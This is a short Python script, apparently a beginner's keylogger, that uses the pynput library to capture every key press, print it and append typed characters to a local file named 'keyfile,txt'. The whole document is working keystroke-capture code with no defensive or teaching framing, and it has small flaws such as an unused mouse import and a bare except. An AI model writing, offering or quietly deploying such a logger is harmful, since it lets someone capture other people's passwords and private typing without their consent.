from pynput import keyboard , mouse

def Keypressed(key):
    print(str(key))
    with open("keyfile,txt" , "a") as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("error")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=Keypressed)
    listener.start()
    input()





